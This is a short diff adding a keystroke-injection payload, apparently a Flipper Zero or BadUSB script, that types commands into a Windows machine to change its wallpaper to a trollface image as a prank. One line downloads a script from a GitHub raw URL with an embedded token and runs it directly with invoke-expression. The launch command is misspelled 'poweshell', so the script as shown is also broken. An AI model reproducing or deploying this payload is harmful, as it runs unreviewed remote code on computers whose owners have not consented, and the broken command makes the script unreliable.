@@ -1,0 +1,13 @@
+GUI r
+DELAY 250
+STRING poweshell
+ENTER
+DELAY 500
+STRING iwr https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png?dl=1 -o $ENV:USERPROFILE\Desktop\troll.jpg
+ENTER
+DELAY 200
+STRING $pl = iwr https://raw.githubusercontent.com/ConDaCat/flipper/main/wallpaper%20funtion?token=GHSAT0AAAAAAB2T6AYQPDSP6EVKQI2EIIYUY3APDDA?dl=1; invoke-expression $pl
+ENTER
+DELAY 200
+STRING  Set-WallPaper -Image "$Env:USERPROFILE\Desktop\troll.jpg" -Style Center
+ENTER
